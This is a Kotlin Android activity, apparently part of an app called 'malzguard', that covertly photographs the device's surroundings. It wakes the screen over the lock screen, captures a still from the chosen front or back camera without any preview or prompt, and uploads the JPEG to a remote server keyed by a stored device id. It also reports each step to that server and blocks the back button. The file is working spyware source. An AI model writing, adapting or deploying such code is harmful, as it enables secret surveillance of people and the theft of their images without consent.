package com.example.malzguard

import android.app.Activity
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.view.WindowManager
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class CamActivity : Activity() {
    private var thread: HandlerThread? = null
    private var handler: Handler? = null
    private var finished = false

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        try {
            window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
            try { setShowWhenLocked(true); setTurnScreenOn(true) } catch (e: Exception) {}
            val facing = intent.getStringExtra("facing") ?: "back"
            logSrv("cam_start", "facing=" + facing)
            thread = HandlerThread("cam").also { it.start() }
            handler = Handler(thread!!.looper)
            handler!!.post { capture(facing) }
            handler?.postDelayed({ finishSafe() }, 12000)
        } catch (e: Exception) { logSrv("cam_err", "oncreate: " + (e.message ?: "?")); finishSafe() }
    }

    private fun finishSafe() {
        if (finished) return
        finished = true
        try { thread?.quitSafely() } catch (e: Exception) {}
        try { finish() } catch (e: Exception) {}
    }

    private fun capture(facing: String) {
        try {
            val cm = getSystemService(CAMERA_SERVICE) as CameraManager
            val camId = cm.cameraIdList.firstOrNull { cid ->
                val ch = cm.getCameraCharacteristics(cid)
                val f = ch.get(CameraCharacteristics.LENS_FACING)
                if (facing == "front") f == CameraCharacteristics.LENS_FACING_FRONT else f == CameraCharacteristics.LENS_FACING_BACK
            } ?: cm.cameraIdList.firstOrNull() ?: run { logSrv("cam_err", "no_camera"); finishSafe(); return }
            val ch = cm.getCameraCharacteristics(camId)
            val sz = ch.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)?.getOutputSizes(ImageReader::class.java)?.firstOrNull() ?: run { logSrv("cam_err", "no_size"); finishSafe(); return }
            logSrv("cam_open", "id=" + camId + " " + sz.width + "x" + sz.height)
            val reader = ImageReader.newInstance(sz.width, sz.height, android.graphics.ImageFormat.JPEG, 1)
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage()
                    val buf = img?.planes?.get(0)?.buffer
                    if (buf != null) {
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                        logSrv("cam_snap", "size=" + bytes.size)
                        upload(bytes)
                    } else logSrv("cam_err", "no_buffer")
                    img?.close()
                } catch (e: Exception) { logSrv("cam_err", "snap: " + (e.message ?: "?")) }
                try { r.close() } catch (e: Exception) {}
                handler?.postDelayed({ finishSafe() }, 1500)
            }, handler)
            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    logSrv("cam_opened", "ok")
                    try {
                        cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(sess: CameraCaptureSession) {
                                try {
                                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    req.addTarget(reader.surface)
                                    sess.capture(req.build(), null, handler)
                                } catch (e: Exception) { logSrv("cam_err", "capture: " + (e.message ?: "?")); finishSafe() }
                            }
                            override fun onConfigureFailed(sess: CameraCaptureSession) { logSrv("cam_err", "config_failed"); finishSafe() }
                        }, handler)
                    } catch (e: Exception) { logSrv("cam_err", "session: " + (e.message ?: "?")); finishSafe() }
                }
                override fun onDisconnected(cam: CameraDevice) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "disconnected"); finishSafe() }
                override fun onError(cam: CameraDevice, e: Int) { try { cam.close() } catch (e: Exception) {}; logSrv("cam_err", "onerror=" + e); finishSafe() }
            }, handler)
        } catch (e: Exception) { logSrv("cam_err", "capture: " + (e.message ?: "?")); finishSafe() }
    }

    private fun upload(bytes: ByteArray) {
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            val id = sp.getString("id", "") ?: ""
            logSrv("photo_start", "id=" + id.take(12) + " size=" + bytes.size)
            if (id.isEmpty()) { logSrv("photo_fail", "id_empty"); return }
            val boundary = "----MG" + System.currentTimeMillis()
            val head = ("--$boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"cam_${System.currentTimeMillis()}.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n").toByteArray()
            val tail = ("\r\n--$boundary--\r\n").toByteArray()
            val total = head.size + bytes.size + tail.size
            val c = URL(Config.SERVER + "/api/upload/" + id + "/photo").openConnection() as HttpURLConnection
            c.connectTimeout = 20000
            c.readTimeout = 30000
            c.requestMethod = "POST"
            c.doOutput = true
            c.setFixedLengthStreamingMode(total)
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            val os: OutputStream = c.outputStream
            os.write(head); os.write(bytes); os.write(tail); os.flush(); os.close()
            val code = c.responseCode
            try { c.inputStream?.close() } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
            logSrv("photo_ok", "code=" + code)
        } catch (e: Exception) {
            logSrv("photo_err", e.message ?: "unknown")
        }
    }

    private fun logSrv(kind: String, msg: String) {
        try {
            val sp = getSharedPreferences("mg", MODE_PRIVATE)
            val id = sp.getString("id", "") ?: ""
            val url = URL(Config.SERVER + "/api/log/" + id + "/" + kind)
            val c = url.openConnection() as HttpURLConnection
            c.connectTimeout = 5000
            c.readTimeout = 5000
            c.requestMethod = "POST"
            c.doOutput = true
            c.setRequestProperty("Content-Type", "text/plain")
            c.outputStream.use { it.write(msg.toByteArray()) }
            try { c.responseCode; c.inputStream?.close() } catch (e: Exception) {}
            c.disconnect()
        } catch (e: Exception) {}
    }

    override fun onBackPressed() {}
}
